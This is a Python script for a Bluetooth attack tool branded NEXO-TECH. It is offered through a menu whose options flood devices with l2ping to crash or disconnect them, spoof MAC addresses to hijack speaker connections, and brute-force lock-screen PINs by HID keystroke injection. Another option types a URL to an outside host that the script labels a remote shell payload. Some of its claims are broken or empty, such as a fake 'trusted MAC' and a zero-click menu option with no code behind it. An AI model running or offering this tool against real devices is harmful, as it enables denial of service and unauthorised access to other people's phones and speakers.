import os
import sys
import time
import subprocess
import threading
import random

# --- NEXO-TECH PRO COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{R}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | |  __|| |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print(f"{G}======================================================={W}")
    print(f"{Y}  CREATED BY:  {W}NEXO-TECH | DEMON ALEX | BLUEY | AGTSMOKY")
    print(f"{Y}  ENGINE:      {R}OMNIPOTENCE GOD-MODE (V13.0){W}")
    print(f"{Y}  STATUS:      {G}[ OVERDEADLY SYSTEM ACTIVE ]{W}")
    print(f"{G}======================================================={W}\n")

# --- MODULE 1: THE SCANNER & SNIFFER ---
def get_targets():
    print(f"{C}[*] NEXO-SCANNER: {G}[ SEARCHING FOR VULNERABLE SIGNALS ]{W}")
    print(f"{Y}-------------------------------------------------------{W}")
    try:
        # Scanning for Classic Bluetooth Devices
        scan_proc = subprocess.check_output(["hcitool", "scan"]).decode('utf-8').split('\n')
        devices = []
        for line in scan_proc:
            if ":" in line:
                parts = line.split('\t')
                mac = parts[1].strip()
                name = parts[2].strip() if len(parts) > 2 else "Unknown Device"
                devices.append({"mac": mac, "name": name})
        
        if not devices:
            print(f"{R}[!] NO DEVICES FOUND. CHECK YOUR BLUETOOTH HW.{W}")
            return None

        for i, dev in enumerate(devices):
            print(f"  {G}[{i+1}]{W} Name: {C}{dev['name']}{W} | MAC: {Y}{dev['mac']}{W}")
        
        print(f"{Y}-------------------------------------------------------{W}")
        choice = int(input(f"{C}[+] Select Target ID: {W}")) - 1
        return devices[choice]['mac']
    except Exception as e:
        print(f"{R}[!] SCANNER ERROR: {e}{W}")
        return None

# --- MODULE 2: THE HIJACK ENGINE (MAC SPOOFING) ---
def hijack_and_spoof(target_mac):
    print(f"\n{C}[*] NEXO-SNIFFER: {G}[ CAPTURING TRUSTED MAC ]{W}")
    # In a pro attack, we spoof the MAC of the device ALREADY connected to the speaker
    # This example spoofs a variation of the target's MAC to trick the whitelist
    trusted_mac = target_mac[:-2] + "FF" 
    
    print(f"{R}[!] PHASE 1: DISCONNECTING ORIGINAL OWNER...{W}")
    # High-speed 'L2CAP' Disconnect Packets
    for _ in range(15):
        os.system(f"sudo l2ping -i hci0 -c 1 -s 1 -f {target_mac} > /dev/null 2>&1")
    
    print(f"{Y}[!] PHASE 2: SPOOFING IDENTITY TO {trusted_mac}...{W}")
    os.system(f"sudo hciconfig hci0 down")
    os.system(f"sudo bdaddr -i hci0 {trusted_mac} > /dev/null 2>&1")
    os.system(f"sudo hciconfig hci0 up")
    
    print(f"{G}[!] PHASE 3: FORCING NEXO-TECH CONNECTION...{W}")
    # Background attempt to grab the RFCOMM slot
    os.system(f"sudo rfcomm connect hci0 {target_mac} 1 &")
    print(f"{G}[+] HIJACK SUCCESSFUL. YOU ARE NOW THE MASTER.{W}")

# --- MODULE 3: THE HID KEYSTROKE INJECTOR ---
def hid_injection(target, mode):
    print(f"{C}[*] NEXO-HID: {G}[ INITIALIZING GHOST KEYBOARD ]{W}")
    if mode == "BRUTE":
        print(f"{R}[!] STARTING LOCK-SCREEN BYPASS...{W}")
        for pin in range(0, 10000):
            p = f"{pin:04d}"
            # Type PIN and press Enter
            os.system(f"hid-gadget-test /dev/hidg0 keyboard {p} enter")
            print(f"{Y}[*] TRYING PIN: {p}{W}", end='\r')
            time.sleep(0.1)
    elif mode == "PAYLOAD":
        print(f"{R}[!] INJECTING REMOTE SHELL PAYLOAD...{W}")
        # Command Sequence: GUI+R -> Type URL -> Enter -> Tab -> Enter
        cmds = ["gui r", "https://nexo-tech.com", "enter", "tab", "enter"]
        for c in cmds:
            os.system(f"hid-gadget-test /dev/hidg0 keyboard {c}")
            time.sleep(0.8)

# --- MODULE 4: THE ANDROID SYSTEM DESTROYER ---
def android_destroyer(target):
    print(f"\n{R}[!] NEXO-CRITICAL: LAUNCHING SYSTEM OVERLOAD...{W}")
    # Flooding with malformed 1000-byte packets
    print(f"{Y}[*] TARGETING L2CAP STACK ON {target}{W}")
    try:
        os.system(f"sudo l2ping -i hci0 -s 1000 -f {target}")
    except KeyboardInterrupt:
        print(f"\n{G}[+] ATTACK HALTED.{W}")

# --- MAIN MENU ---
if __name__ == "__main__":
    show_banner()
    print(f"{G}1.{W} ANDROID CRASHER (L2CAP Flood)   {G}5.{W} PIN BRUTEFORCE (HID)")
    print(f"{G}2.{W} SYSTEM FREEZE (SDP Smash)      {G}6.{W} REMOTE APK PAYLOAD (HID)")
    print(f"{G}3.{W} HIJACK & AUTO-SPOOF (MAC)      {G}7.{W} MEDIA CHAOS (Volume Max)")
    print(f"{G}4.{W} WHISPERPAIR 2025 (Zero-Click)  {G}8.{W} RE-SCAN TARGETS")
    
    op = input(f"\n{C}[+] Selection: {W}")
    
    if op == "8":
        target_mac = get_targets()
    else:
        target_mac = get_targets()
        if target_mac:
            show_banner()
            if op == "1": android_destroyer(target_mac)
            elif op == "2":
                while True: os.system(f"sdptool browse {target_mac} > /dev/null 2>&1")
            elif op == "3": hijack_and_spoof(target_mac)
            elif op == "5": hid_injection(target_mac, "BRUTE")
            elif op == "6": hid_injection(target_mac, "PAYLOAD")
            elif op == "7":
                print(f"{R}[!] FORCING MAX VOLUME ON TARGET...{W}")
                while True: os.system(f"hcitool cmd 0x08 0x0012 {target_mac} 0x01")
